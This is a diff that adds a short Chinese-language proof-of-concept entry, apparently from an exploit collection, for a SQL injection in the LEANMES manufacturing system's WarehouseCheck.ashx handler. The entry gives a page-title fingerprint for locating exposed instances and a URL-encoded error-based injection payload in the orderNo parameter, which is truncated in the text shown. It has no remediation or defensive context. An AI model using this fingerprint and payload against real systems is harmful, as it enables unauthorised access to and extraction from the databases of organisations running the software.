@@ -1,0 +1,6 @@
+# 深科特LEANMES系统WarehouseCheck.ashx存在SQL注入漏洞
+
+- **系统**：深科特LEANMES系统　|　**类型**：SQL注入　|　**CVE**：—
+- **指纹**：`title="LEAN MES - 用户登录"`
+- **请求**：`GET /Handler/WarehouseCheck.ashx?api=GetGrnInfoList&orderNo=1%27+AND+9304+IN+%28SELECT+%28CHAR%28113%29%2BCHAR%2898%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28113%29%2B%28SELECT+%28CASE+WHEN+%289304%3D9304%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28107%`
+- **预期**：200　|　—
